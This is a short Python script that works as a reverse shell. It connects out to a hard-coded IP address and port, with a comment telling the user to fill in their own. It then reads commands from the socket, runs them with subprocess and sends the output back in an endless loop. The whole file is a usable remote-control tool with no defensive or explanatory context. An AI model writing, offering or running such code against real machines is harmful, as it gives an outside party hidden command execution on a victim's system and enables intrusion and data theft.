#!/usr/bin/python          

import socket               
import os
import subprocess

# listen on client on port 1234

# open socket with client
s = socket.socket()         
host = socket.gethostname()
ip = '172.29.114.24' # enter your own one here
port = 1234                
s.connect((ip, port))

# endless loop to capture all input from the clients side
while True:
	try:
		command_input = s.recv(1024).decode('utf-8').replace('\n','') # pick up the clients input
		command = subprocess.Popen([command_input],stdout=subprocess.PIPE, stderr=subprocess.STDOUT) # execute command
		command.wait()
		
		output_command = command.communicate()[0]
		output_command = output_command.decode('utf-8')
		s.send(bytes(output_command,'utf-8')) # send the output back to the client
		
	except Exception:
                # if an error occures the client is asked if the connection has to be closed
                s.send(bytes('Shutdown connection? y/n','utf-8'))
                user = s.recv(1024).decode('utf-8').replace('\n','')
                if user == 'y' or user == 'Y':
                        s.close()
                        break
                else:
                        pass
